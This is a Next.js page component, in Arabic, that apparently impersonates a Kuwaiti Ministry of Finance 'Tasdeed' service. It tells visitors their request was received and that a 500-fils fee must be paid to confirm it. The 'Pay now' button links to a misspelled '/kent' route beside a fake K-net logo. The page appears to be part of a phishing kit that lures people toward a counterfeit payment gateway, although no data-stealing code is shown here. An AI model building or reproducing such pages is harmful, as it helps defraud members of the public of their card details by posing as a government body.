"use client"
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import Link from 'next/link';
import { useEffect, useState } from 'react';

export default function PaymentPage() {
  const [srv,setSer]=useState('')
useEffect(()=>{
  setSer(localStorage.getItem('salm')!)
},[])
  return (
    <div className="flex flex-col min-h-screen">
      {/* Header */}

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-8 max-w-md mx-auto">
        {/* Ministry Logo */}
        <div className="w-48 h-48 mb-8">
          <img
            src="/mmm.png"
            alt="Ministry of Finance Logo"
            width={200}
            height={200}
            className="w-full h-full object-contain"
          />
        </div>

        {/* Tasdeed Logo */}
        <div className="w-full flex justify-end mb-12">
          <div className="w-48 h-16">
            <img
              src="/TasdeedLogo.png"
              alt="Tasdeed Logo"
              width={192}
              height={64}
              className="w-full h-full object-contain"
            />
          </div>
        </div>

        {/* Confirmation Text */}
        <div className="w-full text-center space-y-6 mb-32">
          <p className="text-xl font-medium" dir="rtl">
            تم استلام طلب {srv}          </p>
          <p className="text-2xl font-bold" dir="rtl">
            للتأكيد يجب تسديد 500 فلس
          </p>
        </div>

        {/* Payment Section */}
        <div className="w-full flex justify-between items-center">
          {/* Pay Now Button */}
          <Link
          href={'/kent'}
            className="bg-blue-900 hover:bg-blue-800 text-white px-2 py-2 rounded-md text-lg"
            dir="rtl"
          >
            ادفع الان
          </Link>

          {/* K-net Logo */}
          <div className="w-24 h-16">
            <img
              src="/next.svg"
              alt="K-net Logo"
              width={96}
              height={64}
              className="w-full h-full object-contain"
            />
          </div>
        </div>
      </main>

      {/* Chat Button */}
    </div>
  );
}
